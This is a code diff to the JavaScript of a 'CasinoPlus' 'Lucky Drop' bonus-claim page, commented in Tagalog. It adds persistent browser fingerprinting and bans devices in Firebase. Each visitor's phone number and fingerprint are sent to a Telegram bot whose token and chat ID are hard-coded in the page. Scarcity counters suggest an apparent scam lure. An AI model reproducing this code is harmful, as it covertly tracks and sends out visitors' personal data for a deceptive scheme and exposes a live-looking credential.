@@ -1,5 +1,5 @@
 /**
- * CasinoPlus Index Page - Main Logic
+ * CasinoPlus Index Page - Main Logic with Device Fingerprint Ban
  */
 
 // Firebase reference
@@ -8,6 +8,45 @@ let db = null;
 // Telegram config
 const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
 const chatId = '7298607329';
+
+// ========== DEVICE FINGERPRINT (Hindi nawawala kahit mag-clear ng data) ==========
+function getDeviceFingerprint() {
+    // Kunin ang mga unique specs ng device/browser
+    const screenResolution = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const language = navigator.language;
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+    const deviceMemory = navigator.deviceMemory || 'unknown';
+    
+    // Combine lahat ng specs para maging unique fingerprint
+    const fingerprintString = `${userAgent}|${screenResolution}|${timezone}|${language}|${platform}|${hardwareConcurrency}|${deviceMemory}`;
+    
+    // I-hash para maging simple ang format (optional)
+    let hash = 0;
+    for (let i = 0; i < fingerprintString.length; i++) {
+        hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
+        hash |= 0;
+    }
+    
+    return `FP_${Math.abs(hash)}`;
+}
+
+// Check kung ang device fingerprint ay banned na sa Firebase
+async function isDeviceBanned(fingerprint) {
+    const snap = await db.ref('banned_devices/' + fingerprint).once('value');
+    return snap.exists();
+}
+
+// Ban ang device fingerprint sa Firebase
+async function banDevice(fingerprint, phone, reason) {
+    await db.ref('banned_devices/' + fingerprint).set({
+        phone: phone,
+        reason: reason,
+        timestamp: Date.now()
+    });
+}
 
 // Initialize Firebase
 firebase.initializeApp(firebaseConfig);
@@ -26,7 +65,7 @@ const userPhoneInput = document.getElementById('userPhone');
 const claimBtn = document.getElementById('claimBtn');
 
 // Show blocked UI (claimed or banned)
-function showBlockedUI(reason = "claimed") {
+function showBlockedUI(reason = "claimed", extraMessage = "") {
     const overlay = document.getElementById('modalOverlay');
     overlay.style.display = 'flex';
     
@@ -35,7 +74,12 @@ function showBlockedUI(reason = "claimed") {
     
     if (reason === "banned") {
         title = "TERMINATED";
-        blockMessage = "⚠️ ACCESS_DENIED: This number or device is already detected to have a successful payout.";
+        blockMessage = "⚠️ ACCESS_DENIED: This number or device has already received a successful payout.";
+    }
+    
+    if (reason === "device_banned") {
+        title = "DEVICE BANNED";
+        blockMessage = "⚠️ This device has been permanently restricted. Your device fingerprint is recorded in our system. " + extraMessage;
     }
 
     document.getElementById('modalBodyContent').innerHTML = `
@@ -63,6 +107,7 @@ window.handleVerify = function() {
 window.processStep1 = async function() {
     const phone = userPhoneInput.value.trim();
     const btn = claimBtn;
+    const deviceFingerprint = getDeviceFingerprint();
 
     if (phone.length < 11 || !phone.startsWith('09')) {
         alert("Enter valid 11-digit number.");
@@ -72,29 +117,66 @@ window.processStep1 = async function() {
     btn.disabled = true; 
     btn.innerHTML = "CHECKING SECURE STATUS...";
 
+    // ========== STEP 1: Check kung ang DEVICE FINGERPRINT ay banned na ==========
+    const deviceBanned = await isDeviceBanned(deviceFingerprint);
+    if (deviceBanned) {
+        localStorage.setItem("cp_device_locked", "true");
+        showBlockedUI("device_banned", "Your device fingerprint has been recorded.");
+        return;
+    }
+
+    // ========== STEP 2: Check kung ang PHONE NUMBER ay banned ==========
     db.ref('banned_ghosts/' + phone).once('value', async (banSnap) => {
         if (banSnap.exists()) {
+            // I-ban din ang device fingerprint para hindi na maka-claim gamit ang ibang number
+            await banDevice(deviceFingerprint, phone, "phone_banned");
             localStorage.setItem("cp_device_locked", "true");
             showBlockedUI("banned");
             return;
         }
 
+        // ========== STEP 3: Check kung ang PHONE NUMBER ay naka-claim na ==========
         db.ref('user_logs/' + phone).once('value', async (snapshot) => {
             const userData = snapshot.val();
 
             if (userData && userData.status === 'claimed') {
+                // I-ban din ang device fingerprint
+                await banDevice(deviceFingerprint, phone, "claimed_device");
                 localStorage.setItem("cp_device_locked", "true");
                 showBlockedUI();
                 return;
             }
 
+            // ========== STEP 4: Check kung ang DEVICE ay may na-claim na ibang number ==========
+            const devicePhoneMap = await db.ref('device_phone_map/' + deviceFingerprint).once('value');
+            const previousPhone = devicePhoneMap.val();
+            
+            if (previousPhone && previousPhone !== phone) {
+                // Ang device na ito ay gumamit na ng ibang number dati
+                // Possible na nag-cheat ang user
+                await banDevice(deviceFingerprint, phone, "multiple_numbers");
+                localStorage.setItem("cp_device_locked", "true");
+                showBlockedUI("device_banned", "This device has been detected using multiple numbers.");
+                return;
+            }
+
+            // ========== STEP 5: Static blacklist check ==========
             const blockedList = window.BLACKLISTED_NUMBERS || [];
             if (blockedList.includes(phone)) {
+                await banDevice(deviceFingerprint, phone, "static_blacklist");
                 localStorage.setItem("cp_device_locked", "true");
-                showBlockedUI();
+                showBlockedUI("banned");
                 return;
             }
 
+            // ========== STEP 6: Save device to phone mapping ==========
+            await db.ref('device_phone_map/' + deviceFingerprint).set({
+                phone: phone,
+                firstSeen: Date.now(),
+                lastSeen: Date.now()
+            });
+
+            // ========== STEP 7: Create/Update user session ==========
             db.ref('user_sessions/' + phone).once('value', s => {
                 if(!s.exists()) {
                     db.ref('user_sessions/' + phone).set({
@@ -102,16 +184,21 @@ window.processStep1 = async function() {
                         balance: 0,
                         clicks: 0,
                         hasShared: false,
+                        deviceFingerprint: deviceFingerprint,
                         lastUpdate: Date.now()
                     });
                 } else {
-                    db.ref('user_sessions/' + phone).update({ lastUpdate: Date.now() });
+                    db.ref('user_sessions/' + phone).update({ 
+                        lastUpdate: Date.now(),
+                        deviceFingerprint: deviceFingerprint
+                    });
                 }
             });
 
+            // ========== STEP 8: Proceed to main game ==========
             try {
                 localStorage.setItem("userPhone", phone);
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone)}`);
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone + "\n🖥️ Device FP: " + deviceFingerprint)}`);
                 localStorage.setItem("cp_verified", "true");
                 btn.innerHTML = "SUCCESS...";
                 setTimeout(() => { window.location.href = "main.html"; }, 1000);
@@ -138,7 +225,7 @@ function startTicker() {
     }, 3500);
 }
 
-// Scarcity counter (diminishing bonuses)
+// Scarcity counter
 function startScarcityCounter() {
     setInterval(() => {
         if (count > 15) {
